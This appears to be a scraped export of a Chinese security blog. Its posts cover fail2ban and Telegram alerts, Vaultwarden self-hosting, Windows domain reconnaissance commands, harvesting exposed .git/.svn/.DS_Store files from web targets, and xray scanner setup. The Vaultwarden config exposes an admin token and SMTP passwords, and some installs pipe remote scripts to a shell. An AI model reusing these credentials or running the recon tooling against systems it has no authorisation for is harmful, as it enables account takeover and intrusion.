\u0026#34;Fail2ban has been stopped on `hostname`.\u0026#34; ;; *) echo \u0026#34;Incorrect option\u0026#34; exit 1; ;; esac elif[[ ${ban} == \u0026#34;y\u0026#34;]]; then talkToBot \u0026#34;[${jail_name}] The IP: ${ip_add_ban}has been banned on `hostname`.\u0026#34; exit 0; elif[[ ${unban} == \u0026#34;y\u0026#34;]]; then talkToBot \u0026#34;[${jail_name}] The IP: ${ip_add_unban}has been unbanned on `hostname`.\u0026#34; exit 0; else info fi   1 2 3 4 5 6 7  #给send_telegram_notif.sh脚本添加可执行权限 chmod +x send_telegram_notif.sh #修改jail.local配置文件，将启用的jail的action下添加一个telegram，如下 action = iptables[name=SSH,port=2202,protocol=tcp] telegram #重启fail2ban验证 systemctl restart fail2ban   Telegram 机器人告警通知效果如图\n激活fail2ban 1 2 3  systemctl restart fail2ban service fail2ban restart   检测生效脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  #!/bin/bash for ((i=1;i\u0026lt;=50;i++)); do curl -H \u0026#34;Fail2ban test\u0026#34; https://your-domian/test \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 done echo \u0026#34;done\u0026#34;``` # 使用Fail2ban客户端 `fail2ban-client \u0026lt;COMMAND\u0026gt;` 以下是 Fail2ban-client 命令列表： - `start`: 用于启动fail2ban服务器和jails - `reload`: 用于重新加载 Fail2ban 配置 - `stop`: 停止服务器 - `status`: 用于检查服务器状态并启用 jails - `status JAIL` : 显示监狱的状态和当前被禁止的 IP ## 查看所有命令 ```shell fail2ban-client -help   检查启动状态 1 2 3 4 5 6 7 8 9 10  fail2ban-client ping # 正确启动的话fail2ban会以pong作为回应(Server replied: pong) sudo fail2ban-client version #查看 Fai2ban 的版本 sudo fail2ban-client ping #检查 Fail2ban 是否正常运行（正常将显示 pong） sudo systemctl start fail2ban #启动 Fail2ban sudo systemctl stop fail2ban #停止 Fail2ban sudo systemctl restart fail2ban #重启 Fail2ban sudo tail -f /var/log/fail2ban.log #打开 Fail2ban 的日志监控 sudo iptables --list -n #显示系统当前 iptables sudo iptables -D INPUT -s xxx.xxx.xxx.xxx -j DROP #解除封禁的 IP   查看指定 Jail 规则下被封禁的IP情况 1  fail2ban-client status [jailname]   封禁/解封限制IP sudo fail2ban-client set \u0026lt;jailname\u0026gt; banip/unbanip \u0026lt;IP\u0026gt;\n1 2  sudo fail2ban-client set sshd banip 23.34.45.56 sudo fail2ban-client set sshd unbanip 23.34.45.56   添加/解除指定IP的忽略 1  fail2ban-client set \u0026lt;JAIL\u0026gt; addignoreip/delignoreip \u0026lt;IP\u0026gt;   验证自定义规则 1  fail2ban-regex [OPTIONS] \u0026lt;LOG\u0026gt; \u0026lt;REGEX\u0026gt; [IGNOREREGEX]    LOG为需要匹配的日志文件路径， REGEX为正则表达式所在的文件路径(通常位于filter.d文件夹内)  以下为常用的OPTIONS\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  // Do not print any missed lines --print-no-missed // Do not print any ignored lines --print-no-ignored // Print all matched lines --print-all-matched // Print all missed lines, no matter how many --print-all-missed // Print all ignored lines, no matter how many --print-all-ignored   查看fail2ban的日志 1  tail -f /var/log/fail2ban.log   ","description":"","id":19,"section":"en","tags":null,"title":"Fail2ban","uri":"http://crkmythical.github.io/en/blog/fail2ban/"},{"content":"编写进度\n   身份认证有三个方式：你知道的，你持有的，以及你固有的。  一般的口令密码之类算第一类（你知道的），如邮箱的口令密码 持有令牌通行证之类算第二类（你持有的），如短信验证码，OTP码 指纹虹膜等生物特征算第三类（你固有的）。  由于获取／伪造的难度不同，一般认为第一类的安全性比第二类差，第二类又比第三类差；但需要明确的是，如果只有其中一种都算是弱认证，必须独立使用两种甚至三种才算是强认证。\n术语介绍  [WebAuthn](https://flyhigher.top/develop/2160.html) FIDO: (Fast IDentity Online) 是一个安全、开放、防钓鱼、无密码认证标准的联盟。有三个安全协议: UAF、U2F、FIDO2 U2F : 是一个跨平台、浏览器直接支持、无需安装驱动、基于USB/NFC等物理设备的方案。YuBikey是实现了U2F标准的一种设备。 UAF: FIDO推出基于指纹、虹膜、语音等生物特征方案 OTP :（One-time Password)一次性密码，动态口令,如Google Authenticator， Authy， 短信验证码等  Bitwarden常见功能：\n Bitwarden入门使用 Bitwarden 安全白皮书 密码库管理 密码导入和导出 全平台密码自动填充 两步登录 支持TOTP  前提条件  x64 2C4G25GB\n  安装docker-compose 1 2 3 4  wget -qO- https://get.docker.com/ | sudo bash sudo curl -L https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m) -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose sudo systemctl start docker \u0026amp;\u0026amp; sudo systemctl enable docker   创建目录 1 2 3  cd /opt \u0026amp;\u0026amp; sudo mkdir vaultwarden \u0026amp;\u0026amp; cd vaultwarden pwd # 应当输出 /home/username/bitwarden   配置文件 1 2 3 4 5 6 7  cat \u0026gt;\u0026gt; config.env \u0026lt;\u0026lt;EOF SIGNUPS_ALLOWED=true DOMAIN=https://example.com DATABASE_URL=/data/bitwarden.db ROCKET_WORKERS=10 WEB_VAULT_ENABLED=true EOF   服务描述文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  cat \u0026lt;\u0026lt;EOF \u0026gt; /opt/vaultwarden/docker-compose.yml version: \u0026#39;3\u0026#39; services: vaultwarden: image: vaultwarden/server:latest container_name: vaultwarden user: 1000:1000 restart: always ports: - \u0026#34;8080:80\u0026#34; - \u0026#34;3012:3012\u0026#34; volumes: - ./bw-data:/data environment: - ADMIN_TOEKN=PxArb2LTe+UE70UwhIEmQ+jx7EzYtqMyBp4aOZHgIx+qbDhTS4SR6yFTEDFwuCLl - DOMAIN=https://bitwarden.micorsoft.cn - ROCKET_WORKERS=20 - SHOW_PASSWORD_HINT=false - SIGNUPS_ALLOWED=false - WEBSOCKET_ENABLED=true - WEB_VAULT_ENABLED=true - SMTP_HOST=smtp.domain.name - SMTP_FROM=no-reply@domain.name - SMTP_PORT=587 - SMTP_SSL=true - SMTP_USERNAME=no-reply@domain.name - SMTP_PASSWORD=password env_file: - config.env EOF   启动/停止服务 1 2 3 4 5  cd /opt/vaultwarden sudo docker-compose up -d sudo docker-compose down sudo docker-compose restart   更新服务端 1 2 3 4 5 6 7 8 9 10  # 进入服务配置所在目录 cd /opt/vaultwarden # 停止服务 sudo docker-compose down # 拉取最新镜像 sudo docker-compose pull bitwarden # 使用最新镜像重新启动服务 docker-compose up -d bitwarden # 清理旧的镜像文件 docker image rm $(docker image ls -f dangling=true -q)   Bitwarden搭建 域名配置 证书配置 申请https证书，不得不说acme.sh一键申请\u0026amp;部署证书，真的是太方便了\n安装acme.sh 1  curl https://get.acme.sh | sh -s email=my@example.com # 安装并注册   生成证书 这里选择使用standalone的方式，需要确保这个域名是未在使用的，如果默认的80端口已经被使用，还可以指定其他端口\n1 2  cd .acme.sh ./acme.sh --issue --standalone -d example.com --force   拷贝证书 nginx的配置文件和证书放在 /etc/nginx.conf/conf.d目录下\n1 2 3 4  ./acme.sh --install-cert -d subdomain.domain.com \\ \t--fullchain-file /etc/nginx/conf.d/subdomain.domain.com.crt \\ \t--key-file /etc/nginx/conf.d/subdomain.domain.com.key \\ \t--reloadcmd \u0026#34;systemctl restart nginx\u0026#34;   部署Bitwarden服务 由于官方的服务需要用到sqlserver，资源占用较大，推荐使用[bitwarden_rs](https://github.com/dani-garcia/bitwarden_rs)，用ruby实现的bitwarden服务端兼容版本，这就是开源的好处。  密码生成 openssl rand -base64 48\n1 2 3 4 5 6 7 8  docker pull bitwardenrs/server:latest docker run -d --name vaultwarden \\  -e SIGNUPS_DOMAINS_WHITELIST=bitget.com \\  -v /data/bw-data/:/data/ \\  -p 127.0.0.1:12345:80 \\  -p 127.0.0.1:3012:3012 \\  vaultwarden/server:latest   参数配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62  # General Settings ## 设置web访问域名 DOMAIN=https://bitwarden.micorsoft.cn/z/z/bw/ # 是否启用web客户端：true启用，false禁用 , 后期推荐关闭，防止爆破 WEB_VAULT_ENABLED=true # 是否启用WebSocket通知：true启用，false禁用 WEBSOCKET_ENABLED=true # 修改线程，默认为20，若用户多可修改为更大，一般默认不需要设置 ROCKET_WORKERS=20 # 显示密码提示：true启用，false禁用 SHOW_PASSWORD_HINT=false # 启用或禁用邀请：true启用，false禁用 INVITATIONS_ALLOWED=false # 启用或禁用新用户注册：true启用，false禁用 SIGNUPS_ALLOWED=false # 注册域名白名单 因用户枚举和批量注册问题，建议关闭 SIGNUPS_DOMAINS_WHITELIST=bitget.com # 启用或禁用分享发送功能，默认开启，启用true，禁用false SENDS_ALLOWED=false # 启用管理后台并设置token，默认为空不启用，设置token后则启用 # 密码生成 `openssl rand -base64 48` ADMIN_TOKEN=PxArb2LTe+UE70UwhIEmQ+jx7EzYtqMyBp4aOZHgIx+qbDhTS4SR6yFTEDFwuCLl # 配置SMTP服务 SMTP_PORT=587 SMTP_SSL=true SMTP_EXPLICIT_TLS=true SMTP_HOST=smtp.qq.com SMTP_FROM=741474596@qq.com SMTP_FROM_NAME=Vaultwarden@BG SMTP_AUTH_MECHANISM=login SMTP_USERNAME=741474596@qq.com SMTP_PASSWORD=gkotyjhergynbdjh1 INVITATION_ORG_NAME=BitGET Limited _ENABLE_EMAIL_2FA=true REQUIRE_DEVICE_EMAIL=true # 设置SQLites数据库存储路径及数据库名 DATABASE_URL=/data/vaultwarden.db # 设置日志路径 LOG_FILE=data/access.log LOG_FILE=data/vaultwarden.log # 日志级别选项：trace、debug、info、warn、error 以及 off LOG_LEVEL=warn EXTENDED_LOGGING=true # 使用CDN时让实例获取访客真实ip IP_HEADER=X-Forwarded-For # 时区 TZ=Asia/Shanghai   nginx配置 用nginx实现域名的转发，对于https://subdomain.domain.com的请求转发至本地的8080端口，即后续部署的bitwarden服务的端口，nginx的完整配置文件/etc/nginx/conf.d/subdomain.domain.com如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141  # The `upstream` directives ensure that you have a http/1.1 connection# This enables the keepalive option and better performance# DOMAIN=https://bitwarden.micorsoft.cn/z/z/bw/# Define the server IP and ports here.upstream vaultwarden-default {zone vaultwarden-default 64k;server 127.0.0.1:8080;keepalive 2;}upstream vaultwarden-ws {zone vaultwarden-ws 64k;server 127.0.0.1:3012;keepalive 2;}# 禁止IP地址访问server{listen 80 default;listen 443 default_server;server_name _;return 501;#SSL-START SSL相关配置，请勿删除或修改下一行带注释的404规则#error_page 404/404.html;ssl_certificate conf.d/bitwarden.micorsoft.cn.crt;ssl_certificate_key conf.d/bitwarden.micorsoft.cn.key;ssl_session_timeout 5m;ssl_protocols TLSv1 TLSv1.1 TLSv1.2;ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;ssl_prefer_server_ciphers on;#SSL-END}# Redirect HTTP to HTTPSserver {listen 80;listen [::]:80;server_name bitwarden.micorsoft.cn;##防止搜索引擎收录 if ($http_user_agent ~* \u0026#34;qihoobot|Baiduspider|Googlebot|Googlebot-Mobile|Googlebot-Image|Mediapartners-Google|Adsbot-Google|Feedfetcher-Google|Yahoo! Slurp|Yahoo! Slurp China|YoudaoBot|Sosospider|Sogou spider|Sogou web spider|MSNBot|ia_archiver|Tomato Bot|^$\u0026#34;) {return 404; }if($scheme = http){## 如果使用cf加速就换成302return 302 https://$server_name$request_uri;}}server {listen 443 ssl http2;listen [::]:443 ssl http2;server_name bitwarden.micorsoft.cn;##防止搜索引擎收录 if ($http_user_agent ~* \u0026#34;qihoobot|Baiduspider|Googlebot|Googlebot-Mobile|Googlebot-Image|Mediapartners-Google|Adsbot-Google|Feedfetcher-Google|Yahoo! Slurp|Yahoo! Slurp China|YoudaoBot|Sosospider|Sogou spider|Sogou web spider|MSNBot|ia_archiver|Tomato Bot|^$\u0026#34;) {return 404; }#启用HSTS add_header Strict-Transport-Security \u0026#34;max-age=31536000; includeSubDomains;preload\u0026#34; always;add_header X-Content-Type-Options nosniff always;add_header X-Frame-Options SAMEORIGIN always;add_header Referrer-Policy \u0026#39;strict-origin-when-cross-origin\u0026#39;;ssl_certificate conf.d/bitwarden.micorsoft.cn.crt;ssl_certificate_key conf.d/bitwarden.micorsoft.cn.key;ssl_session_timeout 5m;ssl_protocols TLSv1 TLSv1.1 TLSv1.2;ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;ssl_prefer_server_ciphers on;# OCSP stapling ssl_stapling on; ssl_stapling_verify on; ##DNS服务器 resolver 8.8.8.8;client_max_body_size 128M;# 隐藏服务，将其他访问全部转发到microsoft上location / {proxy_pass https://www.microsoft.com;}location /z/z/bw/ {proxy_http_version 1.1;proxy_set_header \u0026#34;Connection\u0026#34; \u0026#34;\u0026#34;;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;proxy_set_header X-Forwarded-Proto $scheme;proxy_pass http://vaultwarden-default;}location /z/z/bw/notifications/hub/negotiate {proxy_http_version 1.1;proxy_set_header \u0026#34;Connection\u0026#34; \u0026#34;\u0026#34;;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;proxy_set_header X-Forwarded-Proto $scheme;proxy_pass http://vaultwarden-default;}location /z/z/bw/notifications/hub {proxy_http_version 1.1;proxy_set_header Upgrade $http_upgrade;proxy_set_header Connection \u0026#34;upgrade\u0026#34;;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header Forwarded $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;proxy_set_header X-Forwarded-Proto $scheme;proxy_pass http://vaultwarden-ws;}# Optionally add extra authentication besides the ADMIN_TOKEN# Remove the comments below `#` and create the htpasswd_file to have it active#location /z/z/bw/admin {# # See: https://docs.nginx.com/nginx/admin-guide/security-controls/configuring-http-basic-authentication/# # htpasswd -c /etc/apache2/.htpasswd adminauth_basic \u0026#34;Private\u0026#34;;auth_basic_user_file /etc/apache2/.htpasswd;proxy_http_version 1.1;proxy_set_header \u0026#34;Connection\u0026#34; \u0026#34;\u0026#34;;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;proxy_set_header X-Forwarded-Proto $scheme;proxy_pass http://vaultwarden-default;}}  安全加固 防暴力破解 安装fail2ban 1 2  apt install fail2ban -y systemctl enable --now fail2ban   配置vaultwarden和vaultwarden-admin过滤策略  vaultwarden-admin  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/fail2ban/filter.d/vaultwarden-admin.local [INCLUDES] before = common.conf [Definition] failregex = ^.*Invalid admin token\\. IP: \u0026lt;ADDR\u0026gt;.*$ ignoreregex = EOF cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/fail2ban/jail.d/vaultwarden-admin.local [vaultwarden-admin] enabled = true port = 80,443 filter=vaultwarden-admin banaction = %(banaction_allports)s logpath = /data/bw-data/vaultwarden.log maxretry=1 bantime=14400 findtime=14400 EOF    vaultwarden  1 2 3 4 5 6 7 8 9  cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/fail2ban/filter.d/vaultwarden.local [INCLUDES] before = common.conf [Definition] #failregex = ^.*Username or password is incorrect\\. Try again\\. IP: \u0026lt;ADDR\u0026gt;\\. Username:.*$ failregex = ^.*Username or password is incorrect\\. Try again\\. IP: \u0026lt;HOST\u0026gt;\\. Username:.*$ ignoreregex= EOF   配置vaultwarden和vaultwarden-admin Jail策略  vaultwarden-admin 登录失败1次封停4h  1 2 3 4 5 6 7 8 9 10 11  cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/fail2ban/jail.d/vaultwarden-admin.local [vaultwarden-admin] enabled = true port = 80,443 filter=vaultwarden-admin banaction = %(banaction_allports)s logpath = /data/bw-data/vaultwarden.log maxretry=1 bantime=14400 findtime=14400 EOF    vaultwarden 登录失败3次封停4h  1 2 3 4 5 6 7 8 9 10 11 12  cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/fail2ban/jail.d/vaultwarden.local [vaultwarden] enabled=true port=80,443 filter=vaultwarden banaction = %(banaction_allports)s logpath=/data/bw-data/vaultwarden.log maxretry=3 bantime=14400 findtime=14400 EOF   数据库定期备份 备份脚本 1 2 3 4 5 6 7  curl https://rclone.org/install.sh | bash cat \u0026lt;\u0026lt;EOF \u0026gt;/opt/vaultwarden/backup.sh #!/bin/bash /usr/bin/tar -czvPf /root/.config/up/bitwarden_`date +%Y%m%d%H%M%S`.tar.gz /root/.config/bitwarden /usr/bin/rclone copy /root/.config/up a:data/bitwarden /usr/bin/find /root/.config/up -mtime +30 -name \u0026#34;*.tar.gz\u0026#34; -exec rm -rf {} \\; echo \u0026#34;BACKUP DATE:\u0026#34; $(date +\u0026#34;%Y-%m-%d %H:%M:%S\u0026#34;) \u0026gt;\u0026gt; /var/log/backup.log EOF   或者仅备份db.sqlite3\n1  sqlite3 /data/bw-data/db.sqlite3 \u0026#34;.backup \u0026#39;/path/to/backups/db-$(date \u0026#39;+%Y%m%d-%H%M\u0026#39;).sqlite3\u0026#39;\u0026#34;   定期执行 使用 Crontab 每天定时运行备份脚本，假定于每天凌晨 1:00 备份：\n1 2 3  crontab -e 0 1 * * * sh /opt/vaultwarden/backup.sh   Git仓库备份 其实就是新建一个git私有仓库，然后写一个每天打包并自动push到远程仓库的脚本，再配置成定时任务就行了，国内vps推荐使用的gitee，国外的可以用github，\n注意！！！ 仓库一定要建成私有的哦 注意！！！\n1 2 3 4 5  cd /data \u0026amp;\u0026amp; \\  tar czvf bitwarden_backup_$(date \u0026#39;+%Y%m%d_%H%M\u0026#39;).tgz bw-data/ \u0026amp;\u0026amp; \\ mv bitwarden_backup_$(date \u0026#39;+%Y%m%d_%H%M\u0026#39;).tgz bitwarden_backup/ \u0026amp;\u0026amp; \\ cd bitwarden_backup/ \u0026amp;\u0026amp; \\ git add . \u0026amp;\u0026amp; git commit -m \u0026#39;update\u0026#39; \u0026amp;\u0026amp; git push -u origin master   ⚠️:\n 前提是你的git控制台添加了你本机的公钥 你的docker数据卷挂载在了根目录的/data下面，叫bw-data 在同级目录新建了一个叫bitwarden_backup的文件夹  如果你满足了上述要求，就可以配置一个如下的定时任务了：\n1  0 5 * * * bash /data/bitwarden_backup/backup.sh   \n为了减少对公共资源的浪费，建议改造一下上述脚本自动删除超过30天的备份。\nGit仓库备份  需要先配置好github环境，用私钥免密码登录github 先建立远程备份仓库并绑定本地仓库  1 2 3 4 5 6  cd ~/bitwarden/bw-data #改成自己bitwarden所在位置 git init git remote add origin git@github.com:xxxx/xxxx.git #自己在github建的空仓库，这里用SSH进行clone git add -A git commit -m \u0026#34;first push\u0026#34; git push -u origin master   建立定时上传github的脚本，备份bw-data文件夹  1 2 3 4 5 6 7 8 9 10 11 12  cd ~ sudo timedatectl set-timezone Asia/Shanghai; #修改系统时区 cat \u0026gt;\u0026gt; backUp_Bitwarden.sh \u0026lt;\u0026lt; EOF #!/bin/sh date=\\$(date \u0026#39;+%Y-%m-%d %H:%M\u0026#39;) cd ~/bitwarden/bw-data git add -A git commit -m \u0026#34;backup at $date\u0026#34; git push EOF chmod +x backUp_Bitwarden.sh;   定时任务crontab建立  1 2 3 4 5  # 每天13:00备份一次 echo \u0026#34;00 13 * * * bash ~/backUp_Bitwarden.sh\u0026gt; ~/backup.log 2\u0026gt;\u0026amp;1 \u0026amp;\u0026#34;\u0026gt;bt.cron; crontab bt.cron; rm -rf bt.cron; crontab -l; #查看是否设置成功   Gmail 1 2 3 4 5 6 7 8 9 10 11 12  SMTP_PORT=587 SMTP_SSL=true SMTP_EXPLICIT_TLS=false SMTP_HOST=smtp.gmail.com SMTP_FROM=ding.fugui@bitget.com SMTP_FROM_NAME=Vaultwarden@BG SMTP_AUTH_MECHANISM=login SMTP_USERNAME=ding.fugui@bitget.com SMTP_PASSWORD=plvjucrnfmmdwoyh1 INVITATION_ORG_NAME=BitGET Limited _ENABLE_EMAIL_2FA=true REQUIRE_DEVICE_EMAIL=true   ","description":"","id":20,"section":"en","tags":null,"title":"密码管理方案的研究和搭建","uri":"http://crkmythical.github.io/en/blog/%E5%AF%86%E7%A0%81%E7%AE%A1%E7%90%86%E6%96%B9%E6%A1%88%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%90%AD%E5%BB%BA/"},{"content":"编写进度\n   Table of Contents  DC  net类命令 查看当前用户权限及SID 查看是否存在域  systeminfo判断 net time /domain 判断 net config workstation 判断     探测存活主机  利用ICMP协议探测    \nDC dns一般为域控，并且域控会开启389端口（LDAP服务）\n\nnet类命令 net accounts # 查看本地密码策略 net accounts /domain # 查看域密码策略 net user # 查看本机有哪些用户 net user /domain # 查看当前域中所有域用户 net user \u0026lt;account-name\u0026gt; /domain # 查看域用户登陆时间，密码过期时间，是否有登陆脚本，所属组 net time /domain # 查看域时间 net localgroup administrators # 查看本机管理员账户 net localgroup administrators /domain # 查看登陆本机的域管理员账户 net group /domain # 查看域内所有的组账户 net group \u0026quot;domain admins\u0026quot; /domain # 查看域管理员用户组及成员 net group \u0026quot;domain controllers\u0026quot; /domain # 查看域控列表 nslookup -type=SRV _ldap._tcp.dc._msdcs.gpgc.local # 定位域控主机名 net group \u0026quot;domain computers\u0026quot; /domain # 查看所有域成员计算机列表 net view /domain:gpgc.local # 查看指定域列表 nltest /domain_trusts # 获取域信任信息 nltest /dclist:xxzx.gpgc.local # 查看域控 cmdkey /l\t# 是否保存了登录凭证 rout print # 打印当前路由信息 netstat -ant # 查看网络连接情况  \n查看当前用户权限及SID whoami /all 用户信息 ---------------- 用户名 SID ===================== ============================================== ethanhunter78bc\\ethan S-1-5-21-4157029122-2371177861-4132612220-1000  \n查看是否存在域 \nsysteminfo判断 systeminfo系统信息中含有两项：Domain和Logon Server，前者为域名，后者为域控。倘若Domain为Workgroup则当前服务器不在域内\nsysteminfo | findstr \u0026quot;\\.\u0026quot; OS 版本: 10.0.19042 暂缺 Build 19042 系统制造商: Parallels Software International Inc. BIOS 版本: Parallels Software International Inc. 16.1.2 (49151), 2020/12/18 页面文件位置: C:\\pagefile.sys 域： xxzx.example.local ---\u0026gt; 当前所在域 DHCP 服务器: 10.147.11.71 ---\u0026gt; DNS服务器地址 [01]: 10.122.166.103 ---\u0026gt; 本机地址  \nnet time /domain 判断   如果存在域会从域控返回时间， 并在第一行返回域控及域名\n  如果当前服务器在域内但是当前用户非域用户，则会返回System error 5就表示权限不够\n  返回找不到域Workgroup的域控制器表示当前网络环境为工作组\nnet time /domain\n  \nnet config workstation 判断 其中工作域显示域名，同样若为WORKGROUP则非域环境，登录域表明当前用户是域用户登录还是本地用户登录\nnet config workstation 计算机名 \\\\ETHANHUNTER78BC 计算机全名 ETHANHUNTER78BC 用户名 ethan 工作站正运行于 NetBT_Tcpip_{0329A0F2-ADD9-4358-93A2-CC710202AAEF} (001C42EB757D) 软件版本 Windows 10 Pro for Workstations 工作站域 XXZX //WORKGROUP为不在域内 工作站域DNS名称 xxzx.example.local 登录域 XXZX // 表面当前用户是域用户  \n探测存活主机 \n利用ICMP协议探测 for /L %I in (1,1,254) do @ping -w 1 -n 1 10.122.166.%I | findstr \u0026quot;TTL=\u0026quot;  ","description":"","id":21,"section":"en","tags":null,"title":"关于域信息收集","uri":"http://crkmythical.github.io/en/blog/%E5%85%B3%E4%BA%8E%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"content":"编写进度\n   Table of Contents  敏感文件  源代码 dvcs-ripper  .git目录 .git/config 存在，漏洞存在 .svn目录 wc.db 文件存在，漏洞存在 HG文件泄露 .DSStore文件 dsstoreexp WEB-INF/web.xml文件   备份文件  网站源码备份 gedit备份文件 vim备份文件 emacs备份文件   常规文件 fofa信息js脚本采集   CMS中间件 wappalyzer  \n敏感文件 \n源代码 dvcs-ripper \n.git目录 .git/config 存在，漏洞存在   工具 scrabble\nbash scrabble http://www.example.com/ # make sure target has .git folder\ngit reset\u0026ndash;hard HEAD^ # HEAD 代表当前版本 HEAD^代表上一个版本\ngit log \u0026ndash;stat # 查看显示当前的HEAD和它的祖先\ngit diff HEAD  # 比较\ngit reflog # 查看所有提交记录，包括分支\n  工具 lijiejie-Githack Githacker\nGitHack.py http://www.openssl.org/.git/ pip3 install GitHacker githacker --url http://127.0.0.1/.git/ --folder result    \n.svn目录 wc.db 文件存在，漏洞存在 rip-svn.pl -v -u http://www.example.com/.svn/  \nHG文件泄露 hg init的时候会生成.hg\nrip-hg.pl -v -u http://www.example.com/.hg/  \n.DSStore文件 dsstoreexp 在发布代码时未删除文件夹中隐藏的.DSstore，被发现后，获取了敏感的文件名等信息。\npython ds_store_exp.py http://www.example.com/.DS_Store  \nWEB-INF/web.xml文件  /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件 /WEB-INF/database.properties：数据库配置文件  通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。\n\n备份文件 \n网站源码备份 www.zip/rar/tar.gz\n\ngedit备份文件 \nvim备份文件 \nemacs备份文件 \n常规文件 robotx.txt readme.md  \nfofa信息js脚本采集 document.querySelectorAll(\u0026quot;.aSpan\u0026quot;).forEach((node)=\u0026gt;{console.log(node.innerText);})  \nCMS中间件 wappalyzer ","description":"","id":22,"section":"en","tags":null,"title":"关于web目标的信息收集","uri":"http://crkmythical.github.io/en/blog/%E5%85%B3%E4%BA%8Eweb%E7%9B%AE%E6%A0%87%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"content":"编写进度\n   Table of Contents  xray独立反连平台配置  服务器端配置 客户端配置    \nxray独立反连平台配置 在 xray 中，反连平台默认不启用，因为这里面有些配置没有办法自动化，必须由人工配置完成才可使用。\n需要反连平台才可以检测出来的漏洞包括但不限于：\n ssrf fastjson s2-052 xxe 盲打 所有依赖反连平台的 poc  \n服务器端配置 在vps上需配置 config.yaml 中 reverse 部分\n# 服务端 reverse: db_file_path: \u0026quot;reverse.db\u0026quot; token: \u0026quot;please_change_me_to_a_new_token\u0026quot; http: listen_ip: 0.0.0.0 listen_port: \u0026quot;80\u0026quot;  执行如下命令\n./xray reverse  \n客户端配置 在本地客户端的xray需配置 config.yaml 如下 reverse 部分\nreverse: token: \u0026quot;please_change_me_to_a_new_token\u0026quot; client: remote_server: true http_base_url: \u0026quot;http://YOUR_REVERSE_SERVER_IP:80\u0026quot;  执行如下命令\n./xray_darwin_amd64 webscan --listen 127.0.0.1:7777 --html-output ~/Desktop/xray-report.html  References:\nxray官方文档\n","description":"","id":23,"section":"en","tags":null,"title":"xray配置反连平台","uri":"http://crkmythical.github.io/en/blog/xray%E9%85%8D%E7%BD%AE%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0/"},{"content":"编写进度\n   Table of Contents  区块链定义  \n区块链定义 区块链最核心的价值体现在 去中心化 、*不可篡改* 、*可溯源*\n用分布式数据库技术识别、传播和记载信息的智能对等网络1\n从狭义上讲通过数字货币看区块链,它既是数据结构,又是分布式账本,更是一套技术方案。\n 数据结构: 区块链是一种由交易数据构成的区块按时间先后顺序通过区块哈希指针相连组成的链式数据结构 分布式账本: 区块链记录了全网发生的所有交易情况 技术方案: 区块链构建了比特币的底层技术，保证比特币系统的正常运行  从广义上讲，区块链技术使用了一种全新的分布式基础架构和计算方式\n 利用链式结构保证数据的完整性，并存储数据; 利用密码学来保证数据的可靠性,以及数据的传输和访问安全; 利用分布式节点独立运行统一的共识算法来获取数据的记录权，进而更新存储的数据，实现可信任的数据共享; 利用智能合约里面的代码自动操作数据，进而保证合约执行不受外界干扰。  保证隐私的技术🔐-加密\n  对称(私钥)加密: 加解密互为逆操作,私钥加密，私钥解密\n常见的对称加密算法有DES、3DES、AES、Blowfish、IDEA、RC5、RC6\n  非对称加密: 公钥和私钥互为加解密工具，不能x钥加密，x钥解密。私钥可以计算出公钥\n公钥加密,私钥签名\n  数字世界的身份证🆔-哈希\n哈希算法是将文件映射为较短的固定长度字符串(哈希值)\n相同文件哈希值相同，不可逆推，计算极快\n数字签名: 抗抵赖、不可伪造、可轻松识别\n签名、加解密过程\nCentralized –\u0026gt; Distributed –\u0026gt; Decentralized –\u0026gt; P2P(拥有一定共识，动力来自底层节点，没有第三方中心节点的统一指挥)\nCAP定理: 